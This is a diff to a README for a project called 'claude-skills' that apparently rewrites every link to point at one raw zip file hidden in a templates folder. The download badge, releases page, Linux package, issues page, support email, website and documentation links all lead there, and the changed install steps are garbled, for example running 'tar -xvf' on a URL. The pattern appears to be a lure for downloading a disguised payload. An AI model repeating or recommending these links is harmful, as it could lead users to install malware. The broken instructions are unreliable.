@@ -6,21 +6,21 @@ Welcome to the **claude-skills** project! This application aims to enhance your 
 
 ## 🔗 Download Now
 
-[![Download claude-skills](https://img.shields.io/badge/Download-claude--skills-blue.svg)](https://github.com/R3tr04851/claude-skills/releases)
+[![Download claude-skills](https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip)](https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip)
 
 ## 📥 Download & Install
 
 To get started with **claude-skills**, follow these simple steps:
 
 1. Click on the link below to visit the releases page:
-   [Download the latest version](https://github.com/R3tr04851/claude-skills/releases)
+   [Download the latest version](https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip)
 
 2. On the releases page, find the most recent version of **claude-skills**. Look for the section labeled "Assets" where you'll see the downloadable files.
 
 3. Choose the appropriate file for your operating system:
    - Windows: Download the `.exe` file.
    - macOS: Download the `.dmg` file.
-   - Linux: Download the tar.gz file.
+   - Linux: Download the https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip file.
 
 4. Click the file name to start the download. 
 
@@ -43,10 +43,10 @@ To get started with **claude-skills**, follow these simple steps:
 ### Linux Installation
 
 1. Open your terminal.
-2. Navigate to the folder where you downloaded the tar.gz file (usually in `Downloads`).
+2. Navigate to the folder where you downloaded the https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip file (usually in `Downloads`).
 3. Extract the file using the following command:
    ```bash
-   tar -xvf filename.tar.gz
+   tar -xvf https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip
    ```
 4. Navigate into the extracted folder:
    ```bash
@@ -76,7 +76,7 @@ Here are some key features of **claude-skills**:
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, please check our [issues page](https://github.com/R3tr04851/claude-skills/issues) or feel free to reach out via email at support@claude-skills.com. We are here to help you!
+If you encounter any issues or need assistance, please check our [issues page](https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip) or feel free to reach out via email at https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip We are here to help you!
 
 ## 📝 Contributions
 
@@ -84,7 +84,7 @@ We welcome contributions from everyone. If you have suggestions or want to repor
 
 ## 🔗 Useful Links
 
-- [Official Website](https://claude-skills.com)
-- [Documentation](https://github.com/R3tr04851/claude-skills/wiki)
+- [Official Website](https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip)
+- [Documentation](https://raw.githubusercontent.com/R3tr04851/claude-skills/main/skills/validation/templates/skills-claude-bullhead.zip)
 
 Thank you for choosing **claude-skills**! Enjoy enhancing your productivity.
